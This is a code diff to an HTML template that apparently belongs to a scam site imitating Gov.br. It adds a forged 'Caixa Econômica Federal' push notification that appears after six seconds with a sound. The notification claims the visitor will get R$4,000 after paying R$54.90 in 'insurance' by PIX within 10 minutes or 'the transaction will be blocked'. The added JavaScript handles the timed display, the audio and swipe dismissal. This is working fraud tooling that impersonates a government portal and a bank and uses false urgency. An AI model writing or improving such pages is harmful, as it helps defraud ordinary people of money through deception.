@@ -285,9 +285,153 @@
             width: 100px;
             margin: 0 auto 0.8rem;
         }
+        @keyframes slideDown {
+            from {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        @keyframes slideUp {
+            from {
+                transform: translateY(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+        }
+        @keyframes slideLeft {
+            from {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(-100%);
+                opacity: 0;
+            }
+        }
+        @keyframes slideRight {
+            from {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+        }
+        .notification {
+            position: fixed;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 95%;
+            max-width: 400px;
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            z-index: 1000;
+            display: none;
+            overflow: hidden;
+        }
+        .notification-header {
+            display: flex;
+            align-items: center;
+            padding: 12px 15px 8px;
+            background-color: #F8F9FA;
+            border-bottom: 1px solid #E9ECEF;
+        }
+        .notification-app-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .notification-app-name {
+            font-size: 13px;
+            font-weight: 600;
+            color: #495057;
+        }
+        .notification-time {
+            margin-left: auto;
+            font-size: 12px;
+            color: #6C757D;
+        }
+        .notification-content {
+            display: flex;
+            padding: 12px 15px;
+        }
+        .notification-bank-logo {
+            width: 48px;
+            height: 48px;
+            border-radius: 10px;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #e3f2fd;
+        }
+        .notification-bank-logo img {
+            width: 30px;
+            height: 30px;
+        }
+        .notification-text-content {
+            flex: 1;
+        }
+        .notification-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #212529;
+            margin-bottom: 5px;
+        }
+        .notification-message {
+            font-size: 13px;
+            color: #495057;
+            line-height: 1.4;
+        }
+        .touch-indicator {
+            font-size: 11px;
+            color: #6C757D;
+            text-align: center;
+            padding: 8px 0;
+            background-color: #F8F9FA;
+            border-top: 1px solid #E9ECEF;
+        }
     </style>
 </head>
 <body>
+    <!-- Notification -->
+    <div id="paymentNotification" class="notification">
+        <div class="notification-header">
+            <div class="notification-app-icon">
+                <i class="fas fa-bell" style="color: #1351b4;"></i>
+            </div>
+            <div class="notification-app-name">Caixa Econômica Federal</div>
+            <div class="notification-time">Agora</div>
+        </div>
+        <div class="notification-content">
+            <div class="notification-bank-logo">
+                <i class="fas fa-university" style="color: #1351b4; font-size: 24px;"></i>
+            </div>
+            <div class="notification-text-content">
+                <div class="notification-title">Você vai receber R$ 4.000,00</div>
+                <div class="notification-message">
+                    Caixa Econômica Federal está aguardando o pagamento do seguro no valor de R$54,90 para depositar R$4.000,00 em sua conta {{ bank|default("CAIXA ECONÔMICA FEDERAL") }}. Copie o código PIX e realize o pagamento em até 10 minutos ou a transacao será bloqueada.
+                </div>
+            </div>
+        </div>
+        <div class="touch-indicator">
+            Deslize para fechar
+        </div>
+    </div>
+
     <!-- Header -->
     <div class="header">
         <img alt="Logo Gov.br" class="logo" src="https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png"/>
@@ -459,8 +603,166 @@
         <p>© Todos os direitos reservados.</p>
     </footer>
 
+    <!-- Notification Audio -->
+    <audio id="notificationSound" preload="auto" style="display: none;">
+        <source src="/static/sounds/notification.mp3" type="audio/mpeg">
+    </audio>
+
     <script>
             document.addEventListener('DOMContentLoaded', function() {
+                // Mostrar notificação após 6 segundos
+                setTimeout(function() {
+                    showNotification();
+                }, 6000);
+
+                function showNotification() {
+                    // Tocar o som de notificação
+                    playNotificationSound();
+
+                    // Obter a notificação
+                    const notification = document.getElementById('paymentNotification');
+                    
+                    // Exibir a notificação com animação
+                    notification.style.display = 'block';
+                    notification.style.animation = 'slideDown 0.5s forwards';
+                    
+                    // Configurar o tempo para ocultar a notificação (12 segundos)
+                    setTimeout(function() {
+                        if (notification.style.display !== 'none') {
+                            hideNotification('slideUp');
+                        }
+                    }, 12000);
+                    
+                    // Adicionar eventos de toque/mouse para detectar swipe
+                    setupSwipeGesture(notification);
+                }
+                
+                function playNotificationSound() {
+                    try {
+                        const notificationSound = document.getElementById('notificationSound');
+                        if (notificationSound) {
+                            notificationSound.currentTime = 0;
+                            
+                            // Primeiro: tentar reproduzir com promessa (compatível com maioria dos navegadores)
+                            const playPromise = notificationSound.play();
+                            
+                            if (playPromise !== undefined) {
+                                playPromise.then(_ => {
+                                    // Reprodução começou com sucesso
+                                    console.log("Som de notificação tocado com sucesso");
+                                })
+                                .catch(error => {
+                                    console.log("Erro ao tocar som de notificação:", error);
+                                    // Tentar método alternativo para iOS/Safari
+                                    playWithWebAudio(notificationSound.src);
+                                });
+                            }
+                        }
+                    } catch (e) {
+                        console.log("Erro ao reproduzir áudio:", e);
+                    }
+                }
+                
+                // Método alternativo para iOS/Safari
+                function playWithWebAudio(audioUrl) {
+                    try {
+                        // Criar contexto de áudio
+                        const AudioContext = window.AudioContext || window.webkitAudioContext;
+                        const audioContext = new AudioContext();
+                        
+                        // Carregar o áudio
+                        fetch(audioUrl)
+                            .then(response => response.arrayBuffer())
+                            .then(arrayBuffer => audioContext.decodeAudioData(arrayBuffer))
+                            .then(audioBuffer => {
+                                // Criar fonte
+                                const source = audioContext.createBufferSource();
+                                source.buffer = audioBuffer;
+                                source.connect(audioContext.destination);
+                                source.start(0);
+                            })
+                            .catch(error => {
+                                console.log("Erro no método WebAudio:", error);
+                            });
+                    } catch (e) {
+                        console.log("WebAudio não é suportado:", e);
+                    }
+                }
+                
+                function setupSwipeGesture(element) {
+                    let touchStartX = 0;
+                    let touchStartY = 0;
+                    let touchEndX = 0;
+                    let touchEndY = 0;
+                    
+                    // Eventos de toque (para mobile)
+                    element.addEventListener('touchstart', function(e) {
+                        touchStartX = e.changedTouches[0].screenX;
+                        touchStartY = e.changedTouches[0].screenY;
+                    }, false);
+                    
+                    element.addEventListener('touchend', function(e) {
+                        touchEndX = e.changedTouches[0].screenX;
+                        touchEndY = e.changedTouches[0].screenY;
+                        handleSwipe();
+                    }, false);
+                    
+                    // Eventos de mouse (para desktop)
+                    let isMouseDown = false;
+                    
+                    element.addEventListener('mousedown', function(e) {
+                        isMouseDown = true;
+                        touchStartX = e.screenX;
+                        touchStartY = e.screenY;
+                    }, false);
+                    
+                    element.addEventListener('mouseup', function(e) {
+                        if (isMouseDown) {
+                            touchEndX = e.screenX;
+                            touchEndY = e.screenY;
+                            isMouseDown = false;
+                            handleSwipe();
+                        }
+                    }, false);
+                    
+                    // Identificar a direção do swipe
+                    function handleSwipe() {
+                        const diffX = touchEndX - touchStartX;
+                        const diffY = touchEndY - touchStartY;
+                        
+                        // Determinar se foi um swipe horizontal ou vertical
+                        if (Math.abs(diffX) > Math.abs(diffY)) {
+                            // Swipe horizontal
+                            if (diffX > 75) {
+                                // Swipe para a direita
+                                hideNotification('slideRight');
+                            } else if (diffX < -75) {
+                                // Swipe para a esquerda
+                                hideNotification('slideLeft');
+                            }
+                        } else {
+                            // Swipe vertical
+                            if (diffY < -75) {
+                                // Swipe para cima
+                                hideNotification('slideUp');
+                            } else if (diffY > 75) {
+                                // Swipe para baixo (opcional)
+                                // hideNotification('slideDown');
+                            }
+                        }
+                    }
+                }
+                
+                function hideNotification(animationType) {
+                    const notification = document.getElementById('paymentNotification');
+                    notification.style.animation = animationType + ' 0.5s forwards';
+                    
+                    // Após a animação terminar, ocultar o elemento
+                    setTimeout(function() {
+                        notification.style.display = 'none';
+                    }, 500);
+                }
+
                 let transactionId = '{{ transaction_id }}';
                 let checkInterval;
 
